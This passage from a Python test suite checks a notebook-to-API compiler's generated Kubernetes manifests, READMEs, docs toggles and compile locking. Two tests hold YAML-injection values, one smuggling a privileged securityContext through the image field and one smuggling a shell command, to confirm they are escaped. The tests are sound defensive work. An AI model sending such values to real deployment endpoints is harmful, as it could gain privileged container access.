    "metadata.name"/label value (lowercase alphanumeric or '-' only).
    Confirmed exploitable before this fix: `kubernetes_manifest_content`
    interpolated "My_Notebook_App" verbatim into "metadata: name:",
    producing a manifest `kubectl apply -f` rejects outright.
    """
    content = kubernetes_manifest_content("My_Notebook_App", [])

    assert "name: My_Notebook_App" not in content
    assert content.count("  name: my-notebook-app\n") == 2  # Deployment + Service
    assert "    app: my-notebook-app\n" in content
    assert "      app: my-notebook-app\n" in content
    assert "        app: my-notebook-app\n" in content

    # The image *default* is separately lowercased (a later fix, since a
    # Docker image repository name must itself be all-lowercase) -- but
    # is otherwise still built straight from package_name, underscore(s)
    # and all: unlike a Kubernetes resource name, Docker's own naming
    # rule for a repository name allows underscores.
    assert "image: my_notebook_app:latest\n" in content


def test_kubernetes_manifest_content_falls_back_to_generated_for_an_all_underscore_name():
    content = kubernetes_manifest_content("___", [])

    assert "  name: generated\n" in content
    assert "    app: generated\n" in content


def test_kubernetes_manifest_content_truncates_a_package_name_over_63_characters():
    long_name = "a" * 80

    content = kubernetes_manifest_content(long_name, [])

    assert f"  name: {'a' * 63}\n" in content
    assert f"  name: {'a' * 64}\n" not in content


def test_kubernetes_manifest_content_renders_both_a_deployment_and_a_service():

    content = kubernetes_manifest_content("generated", [])

    documents = content.split("\n---\n")
    assert len(documents) == 2
    assert "kind: Deployment" in documents[0]
    assert "kind: Service" in documents[1]


def test_kubernetes_manifest_content_wires_up_health_and_readiness_probes():
    """GET /health and GET /ready are the compiled app's own two built-in
    routes with no Depends(verify_api_key) (see RESERVED_INFRASTRUCTURE_NAMES,
    backend/generator/api_generator.py) -- the same unauthenticated routes
    the Dockerfile's own HEALTHCHECK already curls, so a probe here needs
    no credential this manifest would otherwise have to embed.
    """

    content = kubernetes_manifest_content("generated", [])

    assert "livenessProbe:" in content
    assert "readinessProbe:" in content
    assert content.count("path: /health") == 1
    assert content.count("path: /ready") == 1


def test_kubernetes_manifest_content_maps_container_port_to_the_port_env_var():

    content = kubernetes_manifest_content("generated", [])

    assert "containerPort: 8000" in content
    assert '- name: PORT\n              value: "8000"' in content


def test_kubernetes_manifest_content_lists_every_env_var_with_its_own_default():

    env_vars = [
        {"name": "NOTEBOOK_API_KEY", "default": "dev-key", "description": "..."},
        {"name": "NOTEBOOK_API_MAX_TASKS", "default": "10000", "description": "..."},
    ]

    content = kubernetes_manifest_content("generated", env_vars)

    # "dev-key" needs no YAML quoting (see _yaml_scalar,
    # backend/exporters/openapi_exporter.py); "10000" does, since an
    # unquoted "10000" would parse back as a YAML integer rather than the
    # string value a real container env var must always be.
    # NOTEBOOK_API_KEY is the one exception: a credential, so it is read from
    # a Secret rather than written out as a literal.
    assert 'value: dev-key' not in content
    assert (
        '- name: NOTEBOOK_API_KEY\n              valueFrom:\n'
        '                secretKeyRef:\n                  name: generated-secrets\n'
        '                  key: NOTEBOOK_API_KEY' in content
    )
    assert (
        '- name: NOTEBOOK_API_MAX_TASKS\n              value: "10000"' in content
    )


def test_kubernetes_manifest_content_with_no_env_vars_still_maps_port():
    """An empty env_vars list (or None) must still produce a valid,
    usable manifest -- just with nothing beyond PORT in its own "env:"
    list -- rather than a malformed file missing the "env:" key's own
    required list entirely.
    """

    content = kubernetes_manifest_content("generated", [])

    assert '- name: PORT\n              value: "8000"' in content

    content_none = kubernetes_manifest_content("generated", None)

    assert content_none == content


def test_kubernetes_manifest_content_defaults_image_to_package_name_latest():

    content = kubernetes_manifest_content("myapp", [])

    assert "image: myapp:latest\n" in content

    content_explicit_none = kubernetes_manifest_content("myapp", [], image=None)

    assert content_explicit_none == content


def test_kubernetes_manifest_content_lowercases_an_uppercase_package_name_in_the_default_image():
    """A Docker image repository name must itself be all-lowercase --
    confirmed exploitable before this fix: a compiled package named
    "MyNotebookApp" (a plain Python identifier, the only thing
    package_name_for_output_dir actually enforces) baked
    "MyNotebookApp:latest" into this manifest's own default "image:",
    a reference `docker build`/`docker pull` themselves reject outright.
    POST /api/deploy's own tag default already lowercases for exactly
    this reason -- this brings the plain-compile default (no explicit
    deploy) in line with it.
    """

    content = kubernetes_manifest_content("MyNotebookApp", [])

    assert "image: mynotebookapp:latest\n" in content
    assert "image: MyNotebookApp:latest\n" not in content

    # But a resource name/label value derived from the same package_name
    # is unaffected by this -- already lowercased (and sanitized) by
    # _k8s_resource_name regardless.
    assert "  name: mynotebookapp\n" in content


def test_kubernetes_manifest_content_does_not_lowercase_a_caller_supplied_image():
    """Only the *default* image (derived from package_name) is
    lowercased -- a caller-supplied "image" is used exactly as given,
    since it's an already-existing registry reference this function has
    no business rewriting.
    """

    content = kubernetes_manifest_content(
        "MyNotebookApp", [], image="Registry.Example.com/MyApp:v1"
    )

    assert "image: Registry.Example.com/MyApp:v1\n" in content


def test_kubernetes_manifest_content_respects_a_custom_image():
    """A real cluster can only ever pull an already-pushed image by its
    exact tag -- it can't `docker build` on an operator's behalf the way
    `docker compose up` effectively can. Before "image" existed, this
    manifest's own "image:" was always the hardcoded
    "{package_name}:latest", silently wrong the moment a caller actually
    deployed under any other tag.
    """

    content = kubernetes_manifest_content(
        "myapp", [], image="registry.example.com/myapp:v3"
    )

    assert "image: registry.example.com/myapp:v3\n" in content
    assert "image: myapp:latest" not in content


def test_kubernetes_manifest_content_quotes_an_image_containing_an_embedded_newline():
    """Confirmed exploitable before this fix: `image` was interpolated
    as a raw, unquoted f-string straight into a YAML value position, and
    `image` is caller-controlled byte-for-byte via POST /api/deploy's own
    "tag" (written here on every successful build) and GET
    /api/k8s-preview's own "image" query param. A "tag" containing an
    embedded newline followed by more YAML didn't just fail to parse --
    it successfully injected an entirely new, attacker-chosen key one
    indentation level below "image:", inside this exact container's own
    spec (reachable: securityContext, command, volumeMounts, ...).
    """

    malicious_image = (
        "myimage:latest\n"
        "          securityContext:\n"
        "            privileged: true"
    )

    content = kubernetes_manifest_content("myapp", [], image=malicious_image)

    # The entire malicious value is now a single quoted YAML scalar --
    # its embedded newlines survive only as an escaped "\n" inside the
    # quotes, never as a real line break that could start a new key.
    assert (
        'image: "myimage:latest\\n          securityContext:\\n'
        '            privileged: true"' in content
    )
    assert "\nsecurityContext:" not in content
    assert "          securityContext:\n            privileged: true\n" not in content


def test_kubernetes_manifest_content_escapes_a_double_quote_in_the_image():
    """A value containing its own literal double quote must not be able
    to close _yaml_scalar's own added quoting early.
    """

    content = kubernetes_manifest_content(
        "myapp", [], image='myimage:latest"\ncommand: ["sh"]'
    )

    assert '\\"' in content
    assert '\ncommand: ["sh"]\n' not in content


def test_kubernetes_manifest_content_quotes_a_numeric_looking_env_default():
    """An unquoted "10000" would parse back as a YAML integer, not the
    string value a real container env var must always be -- the same
    "numbers need quoting" rule GET /api/export-openapi's own YAML format
    already applies to every OpenAPI schema string.
    """

    content = kubernetes_manifest_content(
        "generated",
        [{"name": "NOTEBOOK_API_MAX_TASKS", "default": "10000"}],
    )

    assert '- name: NOTEBOOK_API_MAX_TASKS\n              value: "10000"' in content


def test_kubernetes_manifest_content_leaves_an_ordinary_env_default_unquoted():

    content = kubernetes_manifest_content(
        "generated",
        [{"name": "NOTEBOOK_API_ALLOWED_ORIGINS", "default": "example.com"}],
    )

    assert (
        "- name: NOTEBOOK_API_ALLOWED_ORIGINS\n              value: example.com"
        in content
    )


def test_generate_kubernetes_manifest_writes_the_given_image(tmp_path):

    output_path = tmp_path / "kubernetes.yaml"

    generate_kubernetes_manifest(
        str(output_path), "myapp", [], image="registry.example.com/myapp:v3"
    )

    assert (
        "image: registry.example.com/myapp:v3\n"
        in output_path.read_text(encoding="utf-8")
    )


def test_compiler_pipeline_generates_a_kubernetes_manifest_file(tmp_path):
    """Confirmed missing before this feature: a compiled app already got a
    Dockerfile, a docker-compose.yml for a single-host `docker compose up`,
    and a .env.example -- but nothing for a Kubernetes cluster, the
    deployment target GET /api/env-vars-preview's own docstring already
    names alongside docker-compose.yml/.env.example in passing. POST
    /api/compile (and the CLI's own `compile`) now also writes a
    ready-to-`kubectl apply` kubernetes.yaml alongside them, on every
    compile.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    manifest_path = output_dir / "kubernetes.yaml"
    assert manifest_path.is_file()

    manifest = manifest_path.read_text(encoding="utf-8")
    assert "  name: generated\n" in manifest
    # The key is read from a Secret, never baked in as the public default.
    assert "notebook-to-api-dev-key" not in manifest
    assert "secretKeyRef:" in manifest
    assert "NOTEBOOK_API_KEY" in manifest


def test_compiler_pipeline_generates_a_readme_file(tmp_path):
    """Confirmed missing before this feature: a compiled app shipped
    app.py, requirements.txt, a Dockerfile/.dockerignore/docker-
    compose.yml/.env.example, and optionally an OpenAPI export and SDK
    clients -- but nothing telling a human what any of it actually was.
    An operator who downloads GET /api/download's zip, or clones a deploy
    target's repo, had no single file saying which endpoints this
    specific compile exposes, that every one needs an X-API-Key header,
    or even the one command that actually runs the thing they just got.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def train_model(data: list) -> dict:\n    return {}\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    readme_path = output_dir / "README.md"
    assert readme_path.is_file()

    readme = readme_path.read_text(encoding="utf-8")
    assert readme.startswith("# generated")
    assert "`POST /add`" in readme
    assert (
        "`POST /train_model` -- enqueues a background task" in readme
    )
    assert "X-API-Key" in readme
    assert "docker compose up --build" in readme
    assert "NOTEBOOK_API_KEY" in readme


def test_compiler_pipeline_readme_reflects_only_and_exclude_filtering(tmp_path):
    """The README's own endpoint list must reflect what this compile
    actually exposes -- the same functions/only/exclude-filtered list
    generate_fastapi_code itself compiles into endpoints -- not every
    function the notebook happens to define.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def subtract(a: int, b: int) -> int:\n    return a - b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir), only=["add"])

    readme = (output_dir / "README.md").read_text(encoding="utf-8")
    assert "`POST /add`" in readme
    assert "`POST /subtract`" not in readme


def test_compiler_pipeline_bakes_source_notebook_sha256_into_info_endpoint(tmp_path):
    """A running deployed container had no way to self-report which exact
    notebook content actually produced it, short of cross-referencing
    this dashboard's own deploy/compile history externally -- GET /info
    now reports it directly, baked in at compile time.
    """
    import hashlib

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    expected_sha256 = hashlib.sha256(notebook_path.read_bytes()).hexdigest()

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
info = client.get("/info").json()
assert info["source_notebook_sha256"] == {expected_sha256!r}, info

print("SOURCE_NOTEBOOK_SHA256_INFO_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "SOURCE_NOTEBOOK_SHA256_INFO_E2E_OK" in proc.stdout


def test_compiler_pipeline_bakes_the_real_tool_version_into_generated_endpoints(tmp_path):
    """GET / and GET /info both previously reported a hardcoded "1.0.0"
    literal completely unrelated to which actual version of this tool
    compiled the app -- the same "two independent, inevitably-drifting
    hardcoded version literals" bug NOTEBOOK_TO_API_VERSION
    (backend/compiler.py) was already introduced to deduplicate for this
    dashboard's own GET /api/health and GET /, just never threaded
    through to the *generated* app's own identical two literals.
    """

    from backend.compiler import NOTEBOOK_TO_API_VERSION

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
root = client.get("/").json()
info = client.get("/info").json()
assert root["generator_version"] == {NOTEBOOK_TO_API_VERSION!r}, root
assert info["version"] == {NOTEBOOK_TO_API_VERSION!r}, info

print("NOTEBOOK_TO_API_VERSION_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "NOTEBOOK_TO_API_VERSION_E2E_OK" in proc.stdout


def test_compiler_pipeline_bakes_the_real_tool_version_into_the_openapi_schema(tmp_path):
    """A third hardcoded "1.0.0" literal missed the first time this was
    fixed: the FastAPI(...) app object's own `version=` kwarg, which
    feeds directly into this app's own OpenAPI "info.version" --
    user-visible in every compiled app's own /docs (Swagger UI), and
    baked directly into whatever POST /api/export-openapi writes out
    (export_openapi_schema serializes app.openapi() unchanged).
    """

    from backend.compiler import NOTEBOOK_TO_API_VERSION

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from backend.exporters.openapi_exporter import export_openapi_schema
export_openapi_schema("generated/openapi.json", "generated")

import json
with open("generated/openapi.json") as f:
    schema = json.load(f)

assert schema["info"]["version"] == {NOTEBOOK_TO_API_VERSION!r}, schema["info"]

print("OPENAPI_INFO_VERSION_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "OPENAPI_INFO_VERSION_E2E_OK" in proc.stdout


def test_compiler_pipeline_openapi_schema_reports_a_configured_public_url(tmp_path):
    """Confirmed dead code before this fix: the FastAPI(...) constructor's
    own servers=[...] kwarg was silently discarded by custom_openapi,
    which never itself passed servers= to get_openapi(...) --
    app.openapi()["servers"] was never even a key in the resulting
    schema, no matter what NOTEBOOK_API_PUBLIC_URL was set to. Also
    confirms the env var itself is actually read at compiled-app import
    time (when a real deployment's own environment is in effect), not
    baked in at compile time on this dashboard.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import os
import sys

os.environ["NOTEBOOK_API_PUBLIC_URL"] = "https://api.example.com"

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app

schema = app.openapi()
assert schema["servers"] == [
    {{"url": "https://api.example.com", "description": "This deployment"}}
], schema.get("servers")

print("OPENAPI_SERVERS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "OPENAPI_SERVERS_E2E_OK" in proc.stdout


def test_compiler_pipeline_docs_are_reachable_by_default(tmp_path):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
assert client.get("/docs").status_code == 200
assert client.get("/redoc").status_code == 200
assert client.get("/openapi.json").status_code == 200

print("DOCS_ENABLED_BY_DEFAULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "DOCS_ENABLED_BY_DEFAULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_disable_docs_hides_docs_but_not_the_rest_of_the_app(tmp_path):
    """NOTEBOOK_API_DISABLE_DOCS=true must 404 /docs, /redoc, and
    /openapi.json -- every request this app accepts is already
    authenticated via X-API-Key, but the schema and docs UI themselves
    were always served with no such requirement, exposing every
    endpoint's own name, parameters, and example payloads to anyone who
    could merely reach the deployment. Every other route (health, the
    real notebook-derived endpoints) must keep working, and this
    dashboard's own POST /api/export-openapi/export-sdk (which call
    app.openapi() directly, in-process, never through the disabled HTTP
    routes) must too.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import os
import sys

os.environ["NOTEBOOK_API_DISABLE_DOCS"] = "true"

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
assert client.get("/docs").status_code == 404
assert client.get("/redoc").status_code == 404
assert client.get("/openapi.json").status_code == 404
assert client.get("/health").status_code == 200

from backend.exporters.openapi_exporter import export_openapi_schema
export_openapi_schema("generated/openapi.json", "generated")

import json
with open("generated/openapi.json") as f:
    schema = json.load(f)
assert "paths" in schema and schema["paths"]

print("DISABLE_DOCS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "DISABLE_DOCS_E2E_OK" in proc.stdout


def test_compiler_pipeline_disable_docs_accepts_common_truthy_spellings(tmp_path):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    for truthy_value in ("true", "TRUE", "1", "yes", "on"):

        workdir = tmp_path / f"workdir_{truthy_value}"
        workdir.mkdir()

        script = f"""
import os
import sys

os.environ["NOTEBOOK_API_DISABLE_DOCS"] = {truthy_value!r}

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
assert client.get("/docs").status_code == 404, {truthy_value!r}

print("TRUTHY_OK")
"""

        proc = subprocess.run(
            [sys.executable, "-c", script],
            cwd=str(workdir),
            capture_output=True,
            text=True,
            timeout=60,
        )

        assert proc.returncode == 0, f"{truthy_value}: " + proc.stdout + proc.stderr
        assert "TRUTHY_OK" in proc.stdout


def test_compiler_pipeline_dockerignore_excludes_a_real_exported_openapi_and_sdk(
    tmp_path,
):
    """End-to-end: compile a notebook, actually export its OpenAPI schema
    and SDK into the same output_dir (mirroring what POST
    /api/export-openapi + POST /api/export-sdk, or a real `deploy` run
    after them, would do), and confirm the generated .dockerignore's
    patterns actually match the real files that landed on disk -- not
    just that the right literal substrings appear somewhere in its text.
    """
    import fnmatch

    from backend.exporters.openapi_exporter import export_openapi_schema
    from backend.exporters.sdk_generator import generate_python_sdk

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(tmp_path)!r})

from backend.exporters.openapi_exporter import export_openapi_schema
from backend.exporters.sdk_generator import generate_python_sdk

export_openapi_schema({str(output_dir / "openapi.json")!r}, "generated")
generate_python_sdk(
    {str(output_dir / "openapi.json")!r},
    {str(output_dir / "sdk" / "python_client.py")!r},
)
"""
    proc = subprocess.run(
        [sys.executable, "-c", script], capture_output=True, text=True, timeout=30
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr

    dockerignore_patterns = (
        (output_dir / ".dockerignore").read_text(encoding="utf-8").splitlines()
    )

    def is_ignored(relative_path):
        return any(
            fnmatch.fnmatch(relative_path, pattern)
            or relative_path.startswith(pattern)
            for pattern in dockerignore_patterns
        )

    assert is_ignored("openapi.json")
    assert is_ignored("sdk/python_client.py")
    # write_compile_metadata (backend/compiler.py) already wrote this
    # alongside app.py as part of compile_notebook above -- it must be
    # ignored too, since it's never read by the running app and its
    # "source_notebook" field is the compiling server's own filesystem
    # path.
    assert is_ignored(".compile_metadata.json")
    # docker-compose.yml (generate_docker_compose) is a real file
    # compile_notebook above already wrote alongside the Dockerfile --
    # a local-dev/deploy-tooling convenience file the running app never
    # reads, so it must be ignored the same way.
    assert (output_dir / "docker-compose.yml").is_file()
    assert is_ignored("docker-compose.yml")
    # kubernetes.yaml (generate_kubernetes_manifest) is the same kind of
    # deploy-tooling convenience file docker-compose.yml already is, just
    # for a Kubernetes cluster instead of a single host -- it must be
    # ignored for the identical reason.
    assert (output_dir / "kubernetes.yaml").is_file()
    assert is_ignored("kubernetes.yaml")
    # The actually-deployable artifacts must NOT be swept up by the same
    # patterns.
    assert not is_ignored("app.py")
    assert not is_ignored("requirements.txt")
    assert not is_ignored("runtime/notebook_module.py")


def test_compile_notebook_to_api_holds_compile_lock_for_its_whole_write_phase(
    tmp_path, monkeypatch
):
    """POST /api/compile runs as a plain `def` route, scheduled onto
    FastAPI's worker threadpool (see routes/upload.py) specifically so a
    slow compile doesn't block other requests -- which also means two
    overlapping compiles can now genuinely run in two different threads
    at once. Without COMPILE_LOCK serializing compile_notebook_to_api's
    multi-file write sequence, their writes could interleave into a
    corrupted, mismatched output directory.

    Verified directly: a second thread's non-blocking attempt to acquire
    COMPILE_LOCK must fail while the first compile is mid-write, and must
    succeed again once it finishes.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )
    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    entered_write = threading.Event()
    release_write = threading.Event()

    import backend.compiler as compiler_module

    original_write_runtime_module = compiler_module.write_runtime_module

    def blocking_write_runtime_module(code_cells, out_dir):
        entered_write.set()
        assert release_write.wait(timeout=5)
        return original_write_runtime_module(code_cells, out_dir)

    monkeypatch.setattr(
        compiler_module, "write_runtime_module", blocking_write_runtime_module
    )

    compile_thread = threading.Thread(
        target=compile_notebook_to_api,
        args=(str(notebook_path), str(output_dir / "app.py")),
    )
    compile_thread.start()

    assert entered_write.wait(timeout=5), "compile never reached its write phase"

    # COMPILE_LOCK must still be held by the compile in progress.
    assert COMPILE_LOCK.acquire(blocking=False) is False

    release_write.set()
    compile_thread.join(timeout=5)
    assert not compile_thread.is_alive()

    # Free again once the compile has finished.
    assert COMPILE_LOCK.acquire(blocking=False) is True
    COMPILE_LOCK.release()


def test_concurrent_compiles_to_the_same_output_dir_never_produce_a_mixed_result(
    tmp_path,
):
    """Confirmed exploitable before COMPILE_LOCK existed: compiling two
    different notebooks into the same output_dir from two threads at once
    (now possible -- see the test above) could leave app.py describing one
    notebook's function(s) while the runtime module actually holds a
    different notebook's code, since compile_notebook_to_api writes them
    as separate, non-atomic steps. With the lock in place, one compile
    always fully finishes before the other starts, so the final output
    must always match exactly one notebook end to end -- never a mix.
    """

    def _notebook(source):
        notebook = nbformat.v4.new_notebook()
        notebook.cells.append(nbformat.v4.new_code_cell(source))
        return notebook

    notebook_a_path = tmp_path / "a.ipynb"
    with open(notebook_a_path, "w", encoding="utf-8") as f:
        nbformat.write(
            _notebook("def add(a: int, b: int) -> int:\n    return a + b\n"), f
        )

    notebook_b_path = tmp_path / "b.ipynb"
    with open(notebook_b_path, "w", encoding="utf-8") as f:
        nbformat.write(
            _notebook("def multiply(a: int, b: int) -> int:\n    return a * b\n"), f
        )

    output_dir = tmp_path / "generated"
    output_path = str(output_dir / "app.py")

    threads = [
        threading.Thread(
            target=compile_notebook_to_api, args=(str(notebook_a_path), output_path)
        ),
        threading.Thread(
            target=compile_notebook_to_api, args=(str(notebook_b_path), output_path)
        ),
    ]

    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=10)
        assert not t.is_alive()

    app_source = (output_dir / "app.py").read_text(encoding="utf-8")
    runtime_source = (
        output_dir / "runtime" / "notebook_module.py"
    ).read_text(encoding="utf-8")

    if "/add" in app_source:
        assert "def add(" in runtime_source
        assert "def multiply(" not in runtime_source
        assert "/multiply" not in app_source
    else:
        assert "/multiply" in app_source
        assert "def multiply(" in runtime_source
        assert "def add(" not in runtime_source
        assert "/add" not in app_source


def test_compiler_pipeline_handles_magics_and_broken_cells(tmp_path):
    """A notebook with Jupyter magics/shell escapes, and a cell that is
    still unparseable after stripping them, must compile end-to-end
    instead of crashing, and must not lose imports detected in other,
    valid cells.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "%matplotlib inline\n"
            "!pip install pandas\n"
            "import pandas as pd\n\n"
            "def summarize(count: int) -> int:\n"
            "    return count * 2\n"
        )
    )
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "%%bash\necho this cell is not python"
        )
    )

    notebook_path = tmp_path / "magics.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    runtime_module = (
        output_dir / "runtime" / "notebook_module.py"
    ).read_text(encoding="utf-8")

    # The generated runtime module must itself be valid, importable Python.
    ast.parse(runtime_module)

    requirements = (output_dir / "requirements.txt").read_text(
        encoding="utf-8"
    )

    assert "pandas" in requirements


def test_compiler_pipeline_preserves_a_leading_modulo_continuation_line(tmp_path):
    """Confirmed exploitable before this fix: strip_magic_commands
    (backend/parser/notebook_parser.py) treated every physical line
    independently, with no awareness of Python's own lexical structure
    -- a long expression split across lines with the operator leading
    the continuation line (PEP 8's own recommended "break before binary
    operator" style) had its own leading "%" indistinguishable from a
    real top-level "%foo" IPython line magic, and got silently commented
    out. ast.parse still succeeds on the mutilated source (a bare
    "return (\\n    a\\n)" is valid Python), so nothing anywhere in the
    pipeline ever raised -- the compiled endpoint just silently computed
    the wrong result. Verified against a real compiled app via
    TestClient, not just the generated source text: POSTing {"a": 10,
    "b": 3} to the real endpoint must return the real `10 % 3 == 1`, not
    the wrong `10` the bug silently produced (the entire modulo
    discarded).
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def remainder(a: int, b: int) -> int:\n"
            "    total = (\n"
            "        a\n"
            "        % b\n"
            "    )\n"
            "    return total\n"
        )
    )

    notebook_path = tmp_path / "modulo.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
response = client.post(
